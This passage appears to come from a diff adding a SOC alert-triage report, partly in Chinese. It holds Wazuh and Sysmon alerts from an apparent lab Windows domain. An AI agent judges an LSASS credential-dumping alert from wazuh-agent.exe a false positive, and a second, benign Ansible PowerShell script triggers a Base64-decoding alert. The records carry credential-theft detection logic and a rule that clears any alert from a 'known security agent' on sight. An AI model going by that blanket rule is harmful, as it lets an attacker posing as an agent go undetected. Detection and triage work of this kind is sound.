\"C:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll+9feb4|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wow64.dll+3cf4|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wow64.dll+7783|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wow64cpu.dll+1783|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wow64cpu.dll+1199|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wow64.dll+cfda|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wow64.dll+cea0|C:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll+7863d|C:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll+78223|C:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll+781ce|C:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll+717ac(wow64)|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\KERNELBASE.dll+111778(wow64)|C:\\\\\\\\Program Files (x86)\\\\\\\\ossec-agent\\\\\\\\sysinfo.dll+1b7f6(wow64)|C:\\\\\\\\Program Files (x86)\\\\\\\\ossec-agent\\\\\\\\sysinfo.dll+1c401(wow64)|C:\\\\\\\\Program Files (x86)\\\\\\\\ossec-agent\\\\\\\\sysinfo.dll+159b5(wow64)|C:\\\\\\\\Program Files (x86)\\\\\\\\ossec-agent\\\\\\\\syscollector.dll+150a8(wow64)|C:\\\\\\\\Program Files (x86)\\\\\\\\ossec-agent\\\\\\\\syscollector.dll+1537d(wow64)|C:\\\\\\\\Program Files (x86)\\\\\\\\ossec-agent\\\\\\\\syscollector.dll+154de(wow64)\", \"sourceProcessGUID\": \"{85e8c649-7774-6a4b-7d07-000000001400}\", \"targetProcessId\": \"616\", \"utcTime\": \"2026-07-22 03:07:44.298\"}, \"system\": {\"severityValue\": \"INFORMATION\", \"opcode\": \"0\", \"processID\": \"1696\", \"level\": \"4\", \"task\": \"10\", \"eventRecordID\": \"1038979\", \"threadID\": \"1152\", \"message\": \"\\\"Process accessed:\\r\\nRuleName: LSASS_access\\r\\nUtcTime: 2026-07-22 03:07:44.298\\r\\nSourceProcessGUID: {85e8c649-7774-6a4b-7d07-000000001400}\\r\\nSourceProcessId: 3132\\r\\nSourceThreadId: 3432\\r\\nSourceImage: C:\\\\Program Files (x86)\\\\ossec-agent\\\\wazuh-agent.exe\\r\\nTargetProcessGUID: {85e8c649-8397-6a43-0c00-000000001400}\\r\\nTargetProcessId: 616\\r\\nTargetImage: C:\\\\Windows\\\\system32\\\\lsass.exe\\r\\nGrantedAccess: 0x1410\\r\\nCallTrace: C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9feb4|C:\\\\Windows\\\\System32\\\\wow64.dll+3cf4|C:\\\\Windows\\\\System32\\\\wow64.dll+7783|C:\\\\Windows\\\\System32\\\\wow64cpu.dll+1783|C:\\\\Windows\\\\System32\\\\wow64cpu.dll+1199|C:\\\\Windows\\\\System32\\\\wow64.dll+cfda|C:\\\\Windows\\\\System32\\\\wow64.dll+cea0|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+7863d|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+78223|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+781ce|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+717ac(wow64)|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+111778(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\sysinfo.dll+1b7f6(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\sysinfo.dll+1c401(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\sysinfo.dll+159b5(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\syscollector.dll+150a8(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\syscollector.dll+1537d(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\syscollector.dll+154de(wow64)\\r\\nSourceUser: NT AUTHORITY\\\\SYSTEM\\r\\nTargetUser: NT AUTHORITY\\\\SYSTEM\\\"\", \"version\": \"3\", \"keywords\": \"0x8000000000000000\", \"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"10\", \"systemTime\": \"2026-07-22T03:07:44.306606300Z\", \"providerGuid\": \"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\", \"computer\": \"castelblack.north.sevenkingdoms.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\"}}}, \"host\": {\"name\": \"f8e24743dcc1\"}}",
+  "arrival_ms": 1784689672096,
+  "technique_ids": [
+    "T1003.001"
+  ],
+  "source": "wazuh",
+  "rule_id": "100802",
+  "stream": "soc-hids-alert-*",
+  "alert_uid": "be49cf933a069c5cb9df3c8e29e096c0490fe9c914c55df962e9b199ef0d8aa7",
+  "rule_description": "Credential dumping via LSASS access by C:\\\\Program Files (x86)\\\\ossec-agent\\\\wazuh-agent.exe (granted 0x1410)",
+  "sensor": "wazuh-hids",
+  "raw_ref": "soc-hids-alert-2026.07.22:ckbLh58B3gPM8FAeQ0CR",
+  "time": "2026-07-22T03:07:45.283+0000"
+}
+
+### ② 触发上下文(seed:触发事件 / 主语 / 宾语 / 次要实体)
+{
+  "event": {
+    "ingest_time": 1784689805747,
+    "stream": "winlogbeat-*",
+    "granted_access": "0x1410",
+    "event_code": "10",
+    "arrival_ms": 1784689665327,
+    "raw_ref": "soc-hids-alert-2026.07.22:ckbLh58B3gPM8FAeQ0CR",
+    "sensor": "Microsoft-Windows-Sysmon/Operational",
+    "source": "winlogbeat",
+    "call_trace": "C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9feb4|C:\\\\Windows\\\\System32\\\\wow64.dll+3cf4|C:\\\\Windows\\\\System32\\\\wow64.dll+7783|C:\\\\Windows\\\\System32\\\\wow64cpu.dll+1783|C:\\\\Windows\\\\System32\\\\wow64cpu.dll+1199|C:\\\\Windows\\\\System32\\\\wow64.dll+cfda|C:\\\\Windows\\\\System32\\\\wow64.dll+cea0|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+7863d|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+78223|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+781ce|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+717ac(wow64)|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+111778(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\sysinfo.dll+1b7f6(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\sysinfo.dll+1c401(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\sysinfo.dll+159b5(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\syscollector.dll+150a8(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\syscollector.dll+1537d(wow64)|C:\\\\Program Files (x86)\\\\ossec-agent\\\\syscollector.dll+154de(wow64)",
+    "event_time": "2026-07-22T03:07:44.306606300Z",
+    "event_uid": "5206cd8dbb291dfec3adea6bff274d186aef6f01096155736ba9e87774573aba"
+  },
+  "subject": {
+    "_labels": [
+      "Process"
+    ],
+    "image": "C:\\\\Program Files (x86)\\\\ossec-agent\\\\wazuh-agent.exe",
+    "first_seen": "2026-07-06T09:37:56.507Z",
+    "process_guid": "{85e8c649-7774-6a4b-7d07-000000001400}",
+    "last_seen": "2026-07-22T03:07:44.306Z",
+    "hashes": "MD5=A7CEA8DE3FC30334BFD64132B18D21E1,SHA256=A0D539A150087B2406DB7B727DD91E4F647DF6B85A2C9FCC76B0F3645D1DE961,IMPHASH=F2E7F0D79906859422914E1C8EFC36C6",
+    "pid": "3132",
+    "command_line": "\"C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""
+  },
+  "related": [
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "castelblack.north.sevenkingdoms.local",
+        "role": "member_server",
+        "first_seen": "2026-07-02T02:32:06.696Z",
+        "has_adcs": false,
+        "last_seen": "2026-07-22T03:39:48.753Z",
+        "domain": "north.sevenkingdoms.local",
+        "criticality": "medium",
+        "is_dc": false
+      },
+      "rel": "ON_HOST"
+    },
+    {
+      "node": {
+        "_labels": [
+          "Process"
+        ],
+        "image": "C:\\Windows\\system32\\lsass.exe",
+        "first_seen": "2026-07-02T02:32:10.167Z",
+        "process_guid": "{85e8c649-8397-6a43-0c00-000000001400}",
+        "last_seen": "2026-07-22T03:27:58.387Z"
+      },
+      "rel": "ACCESSED"
+    }
+  ]
+}
+
+### ③ 研判   [skill] lsass_dump   [模式] recipe
+# 研判留痕(8 步)
+[1] recipe取证「源进程与访问掩码」→ 1 行
+[2] recipe取证「源进程是否已知安全代理」→ 1 行
+[3] recipe取证「call_trace 指纹」→ 1 行
+[4] recipe取证「父进程链」→ 1 行
+[5] recipe取证「运行账号」→ 1 行
+[6] recipe取证「读后行为」→ 1 行
+[7] recipe取证「结构化发现(findings)」→ 2 行
+[8] recipe取证「_图盲区」→ 1 行
+
+# 研判结果  alert=be49cf933a069c5cb9df3c8e29e096c0490fe9c914c55df962e9b199ef0d8aa7  path=B  skill=lsass_dump
+verdict   : false_positive  (confidence=0.98)
+summary   : Wazuh/OSSEC HIDS 代理自身进行完整性检查/遥测导致的 LSASS 访问，属于头号误报。
+rationale : 1. 源进程为 C:\Program Files (x86)\ossec-agent\wazuh-agent.exe，证据明确标识为'已知安全代理'。2. 调用栈末端为 syscollector.dll，不含 dbghelp/dbgcore 等转储库指纹。3. 根据研判方法论，安全代理触发的此类告警应直接判为 false_positive，且严禁对该代理或其主机进行隔离/杀进程操作。
+evidence  : ['be49cf933a069c5cb9df3c8e29e096c0490fe9c914c55df962e9b199ef0d8aa7', 'lsass.source_is_security_agent']
+agent     : qwen3.5-9b
+处置(建议): 无
+
+============================================================================
+## [5/10] technique=T1140   该类共 195 条   uid=a0da2b4b7fa09f1a66819ac0dde2ce39b51139516ce7913b4a5dadf38d6116bb
+============================================================================
+### ① 原始告警节点(:Alert)
+{
+  "severity": 10,
+  "first_seen": "2026-07-17T09:22:25.568057100Z",
+  "last_seen": "2026-07-17T09:22:25.568057100Z",
+  "raw": "{\"@timestamp\": \"2026-07-17T09:22:27.590Z\", \"timestamp\": \"2026-07-17T09:22:25.607+0000\", \"decoder\": {\"name\": \"windows_eventchannel\"}, \"log\": {\"offset\": 87540557, \"file\": {\"path\": \"/logs/wazuh/alerts.json\"}}, \"log_source\": \"wazuh\", \"rule\": {\"mail\": false, \"groups\": [\"windows\", \" powershell\"], \"level\": 10, \"description\": \"Powershell script may be using Base64 decoding method\", \"id\": \"91809\", \"mitre\": {\"id\": [\"T1140\"], \"tactic\": [\"Defense Evasion\"], \"technique\": [\"Deobfuscate/Decode Files or Information\"]}, \"firedtimes\": 7}, \"manager\": {\"name\": \"e5bb7343f06d\"}, \"agent\": {\"type\": \"filebeat\", \"version\": \"7.17.22\", \"hostname\": \"f8e24743dcc1\", \"ephemeral_id\": \"d5d271ec-e831-42dd-9d03-45d8ccd7a05b\", \"ip\": \"x.x.x.11\", \"id\": \"005\", \"name\": \"winterfell\"}, \"data\": {\"win\": {\"system\": {\"keywords\": \"0x0\", \"severityValue\": \"WARNING\", \"level\": \"3\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nparam(\\n    [Object[]]$Scripts,\\n    [System.Collections.ArrayList][AllowEmptyCollection()]$Variables,\\n    [System.Collections.IDictionary]$Environment,\\n    [System.Collections.IDictionary]$Modules,\\n    [String]$ModuleName,\\n    [System.Management.Automation.LineBreakpoint[]]$Breakpoints = @()\\n)\\nWrite-AnsibleLog \\\"INFO - creating new PowerShell pipeline for $ModuleName\\\" \\\"module_wrapper\\\"\\n$ps = [PowerShell]::Create()\\nif ($ModuleName -ne \\\"script\\\") {\\n    $ps.Runspace.SessionStateProxy.SetVariable(\\\"ErrorActionPreference\\\", \\\"Stop\\\")\\n}\\nif ($host.Name -eq \\\"ConsoleHost\\\") {\\n    Write-AnsibleLog \\\"INFO - setting console input encoding to UTF8 for $ModuleName\\\" \\\"module_wrapper\\\"\\n    $ps.AddScript('[Console]::InputEncoding = New-Object Text.UTF8Encoding $false').AddStatement() > $null\\n}\\nforeach ($variable in $Variables) {\\n    Write-AnsibleLog \\\"INFO - setting variable '$($variable.Name)' for $ModuleName\\\" \\\"module_wrapper\\\"\\n    $ps.AddCommand(\\\"Set-Variable\\\").AddParameters($variable).AddStatement() > $null\\n}\\nif ($Environment) {\\n    Write-AnsibleLog \\\"INFO - setting environment vars for $ModuleName\\\" \\\"module_wrapper\\\"\\n    $ps.Runspace.SessionStateProxy.SetVariable(\\\"_AnsibleEnvironment\\\", $Environment)\\n    $ps.AddScript(@'\\nforeach ($env_kv in $_AnsibleEnvironment.GetEnumerator()) {\\n    [System.Environment]::SetEnvironmentVariable($env_kv.Key, $env_kv.Value)\\n}\\n'@).AddStatement() > $null\\n}\\nif ($Modules) {\\n    foreach ($module in $Modules.GetEnumerator()) {\\n        Write-AnsibleLog \\\"INFO - create module util '$($module.Key)' for $ModuleName\\\" \\\"module_wrapper\\\"\\n        $module_name = $module.Key\\n        $module_code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($module.Value))\\n        $ps.AddCommand(\\\"New-Module\\\").AddParameters(@{Name=$module_name; ScriptBlock=[ScriptBlock]::Create($module_code)}) > $null\\n        $ps.AddCommand(\\\"Import-Module\\\").AddParameter(\\\"WarningAction\\\", \\\"SilentlyContinue\\\") > $null\\n        $ps.AddCommand(\\\"Out-Null\\\").AddStatement() > $null\\n    }\\n}\\n$ps.AddScript('Function Write-Host($msg) { Write-Output -InputObject $msg }').AddStatement() > $null\\nforeach ($script in $Scripts) {\\n    $ps.AddScript($script).AddStatement() > $null\\n}\\nif ($Breakpoints.Count -gt 0) {\\n    Write-AnsibleLog \\\"INFO - adding breakpoint to runspace that will run the modules\\\" \\\"module_wrapper\\\"\\n    if ($PSVersionTable.PSVersion.Major -eq 3) {\\n        $set_method = $ps.Runspace.Debugger.GetType().GetMethod(\\n            'AddLineBreakpoint', [System.Reflection.BindingFlags]'Instance, NonPublic'\\n        )\\n        foreach ($b in $Breakpoints) {\\n            $set_method.Invoke($ps.Runspace.Debugger, [Object[]]@(,$b)) > $null\\n        }\\n    } else {\\n        $ps.Runspace.Debugger.SetBreakpoints($Breakpoints)\\n    }\\n}\\nWrite-AnsibleLog \\\"INFO - start module exec with Invoke() - $ModuleName\\\" \\\"module_wrapper\\\"\\n$orig_out = [System.Console]::Out\\n$sb = New-Object -TypeName System.Text.StringBuilder\\n$new_out = New-Object -TypeName System.IO.StringWriter -ArgumentList $sb\\ntry {\\n    [System.Console]::SetOut($new_out)\\n    $module_output = $ps.Invoke()\\n} catch {\\n    $error_params = @{\\n        Message = \\\"Unhandled exception while executing module\\\"\\n        ErrorRecord = $_\\n    }\\n    if ($_.Exception.PSObject.Properties.Name -contains \\\"InnerException\\\") {\\n        $inner_exception = $_.Exception.InnerException\\n        if ($inner_exception.PSObject.Properties.Name -contains \\\"ErrorRecord\\\") {\\n            $error_params.ErrorRecord = $inner_exception.ErrorRecord\\n        }\\n    }\\n    Write-AnsibleError @error_params\\n    $host.SetShouldExit(1)\\n    return\\n} finally {\\n    [System.Console]::SetOut($orig_out)\\n    $new_out.Dispose()\\n}\\nif ($ps.InvocationStateInfo.State -eq \\\"Failed\\\" -and $ModuleName -ne \\\"script\\\") {\\n    $reason = $ps.InvocationStateInfo.Reason\\n    $error_params = @{\\n        Message = \\\"Unhandled exception while executing module\\\"\\n    }\\n    if ($null -eq $reason) {\\n        $error_params.Message += \\\": Unknown error\\\"\\n    } elseif ($reason.PSObject.Properties.Name -contains \\\"ErrorRecord\\\") {\\n        $error_params.ErrorRecord = $reason.ErrorRecord\\n    } else {\\n        $error_params.Message += \\\": $($reason.ToString())\\\"\\n    }\\n    Write-AnsibleError @error_params\\n    $host.SetShouldExit(1)\\n    return\\n}\\nWrite-AnsibleLog \\\"INFO - module exec ended $ModuleName\\\" \\\"module_wrapper\\\"\\n$stdout = $sb.ToString()\\nif ($stdout) {\\n    Write-Output -InputObject $stdout\\n}\\nif ($module_output.Count -gt 0) {\\n    Write-AnsibleLog \\\"INFO - using the output stream for module output - $ModuleName\\\" \\\"module_wrapper\\\"\\n    Write-Output -InputObject ($module_output -join \\\"`r`n\\\")\\n}\\n$rc = $ps.Runspace.SessionStateProxy.GetVariable(\\\"LASTEXITCODE\\\")\\nif ($null -ne $rc) {\\n    Write-AnsibleLog \\\"INFO - got an rc of $rc from $ModuleName exec\\\" \\\"module_wrapper\\\"\\n    $host.SetShouldExit($rc)\\n}\\nif ($ps.HadErrors -or ($PSVersionTable.PSVersion.Major -lt 4 -and $ps.Streams.Error.Count -gt 0)) {\\n    Write-AnsibleLog \\\"WARN - module had errors, outputting error info $ModuleName\\\" \\\"module_wrapper\\\"\\n    if ($null -eq $rc) {\\n        $host.SetShouldExit(1)\\n    }\\n    foreach ($err in $ps.Streams.Error) {\\n        $error_msg = Format-AnsibleException -ErrorRecord $err\\n        Write-AnsibleLog \\\"WARN - error msg for for $($ModuleName):`r`n$error_msg\\\" \\\"module_wrapper\\\"\\n        $host.UI.WriteErrorLine($error_msg)\\n    }\\n}\\r\\n\\r\\nScriptBlock ID: ab975f95-1505-4c55-b3c4-ae44f01a9128\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2026-07-17T09:22:25.568057100Z\", \"processID\": \"4720\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"eventRecordID\": \"246464\", \"task\": \"2\", \"computer\": \"winterfell.north.sevenkingdoms.local\", \"threadID\": \"4200\", \"eventID\": \"4104\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"opcode\": \"15\", \"providerName\": \"Microsoft-Windows-PowerShell\"}, \"eventdata\": {\"scriptBlockText\": \"param(     [Object[]]$Scripts,     [System.Collections.ArrayList][AllowEmptyCollection()]$Variables,     [System.Collections.IDictionary]$Environment,     [System.Collections.IDictionary]$Modules,     [String]$ModuleName,     [System.Management.Automation.LineBreakpoint[]]$Breakpoints = @() ) Write-AnsibleLog \\\\\\\"INFO - creating new PowerShell pipeline for $ModuleName\\\\\\\" \\\\\\\"module_wrapper\\\\\\\" $ps = [PowerShell]::Create() if ($ModuleName -ne \\\\\\\"script\\\\\\\") {     $ps.Runspace.SessionStateProxy.SetVariable(\\\\\\\"ErrorActionPreference\\\\\\\", \\\\\\\"Stop\\\\\\\") } if ($host.Name -eq \\\\\\\"ConsoleHost\\\\\\\") {     Write-AnsibleLog \\\\\\\"INFO - setting console input encoding to UTF8 for $ModuleName\\\\\\\" \\\\\\\"module_wrapper\\\\\\\"     $ps.AddScript('[Console]::InputEncoding = New-Object Text.UTF8Encoding $false').AddStatement() &gt; $null } foreach ($variable in $Variables) {     Write-AnsibleLog \\\\\\\"INFO - setting variable '$($variable.Name)' for $ModuleName\\\\\\\" \\\\\\\"module_wrapper\\\\\\\"     $ps.AddCommand(\\\\\\\"Set-Variable\\\\\\\").AddParameters($variable).AddStatement() &gt; $null } if ($Environment) {     Write-AnsibleLog \\\\\\\"INFO - setting environment vars for $ModuleName\\\\\\\" \\\\\\\"module_wrapper\\\\\\\"     $ps.Runspace.SessionStateProxy.SetVariable(\\\\\\\"_AnsibleEnvironment\\\\\\\", $Environment)     $ps.AddScript(@' foreach ($env_kv in $_AnsibleEnvironment.GetEnumerator()) {     [System.Environment]::SetEnvironmentVariable($env_kv.Key, $env_kv.Value) } '@).AddStatement() &gt; $null } if ($Modules) {     foreach ($module in $Modules.GetEnumerator()) {         Write-AnsibleLog \\\\\\\"INFO - create module util '$($module.Key)' for $ModuleName\\\\\\\" \\\\\\\"module_wrapper\\\\\\\"         $module_name = $module.Key         $module_code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($module.Value))         $ps.AddCommand(\\\\\\\"New-Module\\\\\\\").AddParameters(@{Name=$module_name; ScriptBlock=[ScriptBlock]::Create($module_code)}) &gt; $null         $ps.AddCommand(\\\\\\\"Import-Module\\\\\\\").AddParameter(\\\\\\\"WarningAction\\\\\\\", \\\\\\\"SilentlyContinue\\\\\\\") &gt; $null         $ps.AddCommand(\\\\\\\"Out-Null\\\\\\\").AddStatement() &gt; $null     } } $ps.AddScript('Function Write-Host($msg) { Write-Output -InputObject $msg }').AddStatement() &gt; $null foreach ($script in $Scripts) {     $ps.AddScript($script).AddStatement() &gt; $null } if ($Breakpoints.Count -gt 0) {     Write-AnsibleLog \\\\\\\"INFO - adding breakpoint to runspace that will run the modules\\\\\\\" \\\\\\\"module_wrapper\\\\\\\"     if ($PSVersionTable.PSVersion.Major -eq 3) {         $set_method = $ps.Runspace.Debugger.GetType().GetMethod(             'AddLineBreakpoint', [System.Reflection.BindingFlags]'Instance, NonPublic'         )         foreach ($b in $Breakpoints) {             $set_method.Invoke($ps.Runspace.Debugger, [Object[]]@(,$b)) &gt; $null         }     } else {         $ps.Runspace.Debugger.SetBreakpoints($Breakpoints)     } } Write-AnsibleLog \\\\\\\"INFO - start module exec with Invoke() - $ModuleName\\\\\\\" \\\\\\\"module_wrapper\\\\\\\" $orig_out = [System.Console]::Out $sb = New-Object -TypeName System.Text.StringBuilder $new_out = New-Object -TypeName System.IO.StringWriter -ArgumentList $sb try {     [System.Console]::SetOut($new_out)     $module_output = $ps.Invoke() } catch {     $error_params = @{         Message = \\\\\\\"Unhandled exception while executing module\\\\\\\"         ErrorRecord = $_     }     if ($_.Exception.PSObject.Properties.Name -contains \\\\\\\"InnerException\\\\\\\") {         $inner_exception = $_.Exception.InnerException         if ($inner_exception.PSObject.Properties.Name -contains \\\\\\\"ErrorRecord\\\\\\\") {             $error_params.ErrorRecord = $inner_exception.ErrorRecord         }     }     Write-AnsibleError @error_params     $host.SetShouldExit(1)     return } finally {     [System.Console]::SetOut($orig_out)     $new_out.Dispose() } if ($ps.InvocationStateInfo.State -eq \\\\\\\"Failed\\\\\\\" -and $ModuleName -ne \\\\\\\"script\\\\\\\") {     $reason = $ps.InvocationStateInfo.Reason     $error_params = @{         Message = \\\\\\\"Unhandled exception while executing module\\\\\\\"     }     if ($null -eq $reason) {         $error_params.Message += \\\\\\\": Unknown error\\\\\\\"     } elseif ($reason.PSObject.Properties.Name -contains \\\\\\\"ErrorRecord\\\\\\\") {         $error_params.ErrorRecord = $reason.ErrorRecord     } else {         $error_params.Message += \\\\\\\": $($reason.ToString())\\\\\\\"     }     Write-AnsibleError @error_params     $host.SetShouldExit(1)     return } Write-AnsibleLog \\\\\\\"INFO - module exec ended $ModuleName\\\\\\\" \\\\\\\"module_wrapper\\\\\\\" $stdout = $sb.ToString() if ($stdout) {     Write-Output -InputObject $stdout } if ($module_output.Count -gt 0) {     Write-AnsibleLog \\\\\\\"INFO - using the output stream for module output - $ModuleName\\\\\\\" \\\\\\\"module_wrapper\\\\\\\"     Write-Output -InputObject ($module_output -join \\\\\\\"`r`n\\\\\\\") } $rc = $ps.Runspace.SessionStateProxy.GetVariable(\\\\\\\"LASTEXITCODE\\\\\\\") if ($null -ne $rc) {     Write-AnsibleLog \\\\\\\"INFO - got an rc of $rc from $ModuleName exec\\\\\\\" \\\\\\\"module_wrapper\\\\\\\"     $host.SetShouldExit($rc) } if ($ps.HadErrors -or ($PSVersionTable.PSVersion.Major -lt 4 -and $ps.Streams.Error.Count -gt 0)) {     Write-AnsibleLog \\\\\\\"WARN - module had errors, outputting error info $ModuleName\\\\\\\" \\\\\\\"module_wrapper\\\\\\\"     if ($null -eq $rc) {         $host.SetShouldExit(1)     }     foreach ($err in $ps.Streams.Error) {         $error_msg = Format-AnsibleException -ErrorRecord $err         Write-AnsibleLog \\\\\\\"WARN - error msg for for $($ModuleName):`r`n$error_msg\\\\\\\" \\\\\\\"module_wrapper\\\\\\\"         $host.UI.WriteErrorLine($error_msg)     } }\", \"scriptBlockId\": \"ab975f95-1505-4c55-b3c4-ae44f01a9128\", \"messageNumber\": \"1\", \"messageTotal\": \"1\"}}}, \"log_type\": \"hids_alert\", \"ecs\": {\"version\": \"1.12.0\"}, \"host\": {\"name\": \"f8e24743dcc1\"}, \"id\": \"1784280145.158011109\", \"location\": \"EventChannel\", \"input\": {\"type\": \"log\"}}",
+  "arrival_ms": 1784280147590,
+  "technique_ids": [
+    "T1140"
+  ],
+  "source": "wazuh",
+  "rule_id": "91809",
+  "stream": "soc-hids-alert-*",
+  "alert_uid": "a0da2b4b7fa09f1a66819ac0dde2ce39b51139516ce7913b4a5dadf38d6116bb",
+  "rule_description": "Powershell script may be using Base64 decoding method",
+  "sensor": "wazuh-hids",
+  "raw_ref": "soc-hids-alert-2026.07.17:tSxib58B3gPM8FAeagJ2",
+  "time": "2026-07-17T09:22:25.607+0000"
+}
+
+### ② 触发上下文(seed:触发事件 / 主语 / 宾语 / 次要实体)
+{
+  "event": {
+    "message_no": "1",
+    "script_block_text": "param(     [Object[]]$Scripts,     [System.Collections.ArrayList][AllowEmptyCollection()]$Variables,     [System.Collections.IDictionary]$Environment,     [System.Collections.IDictionary]$Modules,     [String]$ModuleName,     [System.Management.Automation.LineBreakpoint[]]$Breakpoints = @() ) Write-AnsibleLog \\\"INFO - creating new PowerShell pipeline for $ModuleName\\\" \\\"module_wrapper\\\" $ps = [PowerShell]::Create() if ($ModuleName -ne \\\"script\\\") {     $ps.Runspace.SessionStateProxy.SetVariable(\\\"ErrorActionPreference\\\", \\\"Stop\\\") } if ($host.Name -eq \\\"ConsoleHost\\\") {     Write-AnsibleLog \\\"INFO - setting console input encoding to UTF8 for $ModuleName\\\" \\\"module_wrapper\\\"     $ps.AddScript('[Console]::InputEncoding = New-Object Text.UTF8Encoding $false').AddStatement() &gt; $null } foreach ($variable in $Variables) {     Write-AnsibleLog \\\"INFO - setting variable '$($variable.Name)' for $ModuleName\\\" \\\"module_wrapper\\\"     $ps.AddCommand(\\\"Set-Variable\\\").AddParameters($variable).AddStatement() &gt; $null } if ($Environment) {     Write-AnsibleLog \\\"INFO - setting environment vars for $ModuleName\\\" \\\"module_wrapper\\\"     $ps.Runspace.SessionStateProxy.SetVariable(\\\"_AnsibleEnvironment\\\", $Environment)     $ps.AddScript(@' foreach ($env_kv in $_AnsibleEnvironment.GetEnumerator()) {     [System.Environment]::SetEnvironmentVariable($env_kv.Key, $env_kv.Value) } '@).AddStatement() &gt; $null } if ($Modules) {     foreach ($module in $Modules.GetEnumerator()) {         Write-AnsibleLog \\\"INFO - create module util '$($module.Key)' for $ModuleName\\\" \\\"module_wrapper\\\"         $module_name = $module.Key         $module_code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($module.Value))         $ps.AddCommand(\\\"New-Module\\\").AddParameters(@{Name=$module_name; ScriptBlock=[ScriptBlock]::Create($module_code)}) &gt; $null         $ps.AddCommand(\\\"Import-Module\\\").AddParameter(\\\"WarningAction\\\", \\\"SilentlyContinue\\\") &gt; $null         $ps.AddCommand(\\\"Out-Null\\\").AddStatement() &gt; $null     } } $ps.AddScript('Function Write-Host($msg) { Write-Output -InputObject $msg }').AddStatement() &gt; $null foreach ($script in $Scripts) {     $ps.AddScript($script).AddStatement() &gt; $null } if ($Breakpoints.Count -gt 0) {     Write-AnsibleLog \\\"INFO - adding breakpoint to runspace that will run the modules\\\" \\\"module_wrapper\\\"     if ($PSVersionTable.PSVersion.Major -eq 3) {         $set_method = $ps.Runspace.Debugger.GetType().GetMethod(             'AddLineBreakpoint', [System.Reflection.BindingFlags]'Instance, NonPublic'         )         foreach ($b in $Breakpoints) {             $set_method.Invoke($ps.Runspace.Debugger, [Object[]]@(,$b)) &gt; $null         }     } else {         $ps.Runspace.Debugger.SetBreakpoints($Breakpoints)     } } Write-AnsibleLog \\\"INFO - start module exec with Invoke() - $ModuleName\\\" \\\"module_wrapper\\\" $orig_out = [System.Console]::Out $sb = New-Object -TypeName System.Text.StringBuilder $new_out = New-Object -TypeName System.IO.StringWriter -ArgumentList $sb try {     [System.Console]::SetOut($new_out)     $module_output = $ps.Invoke() } catch {     $error_params = @{         Message = \\\"Unhandled exception while executing module\\\"         ErrorRecord = $_     }     if ($_.Exception.PSObject.Properties.Name -contains \\\"InnerException\\\") {         $inner_exception = $_.Exception.InnerException         if ($inner_exception.PSObject.Properties.Name -contains \\\"ErrorRecord\\\") {             $error_params.ErrorRecord = $inner_exception.ErrorRecord         }     }     Write-AnsibleError @error_params     $host.SetShouldExit(1)     return } finally {     [System.Console]::SetOut($orig_out)     $new_out.Dispose() } if ($ps.InvocationStateInfo.State -eq \\\"Failed\\\" -and $ModuleName -ne \\\"script\\\") {     $reason = $ps.InvocationStateInfo.Reason     $error_params = @{         Message = \\\"Unhandled exception while executing module\\\"     }     if ($null -eq $reason) {         $error_params.Message += \\\": Unknown error\\\"     } elseif ($reason.PSObject.Properties.Name -contains \\\"ErrorRecord\\\") {         $error_params.ErrorRecord = $reason.ErrorRecord     } else {         $error_params.Message += \\\": $($reason.ToString())\\\"     }     Write-AnsibleError @error_params     $host.SetShouldExit(1)     return } Write-AnsibleLog \\\"INFO - module exec ended $ModuleName\\\" \\\"module_wrapper\\\" $stdout = $sb.ToString() if ($stdout) {     Write-Output -InputObject $stdout } if ($module_output.Count -gt 0) {     Write-AnsibleLog \\\"INFO - using the output stream for module output - $ModuleName\\\" \\\"module_wrapper\\\"     Write-Output -InputObject ($module_output -join \\\"`r`n\\\") } $rc = 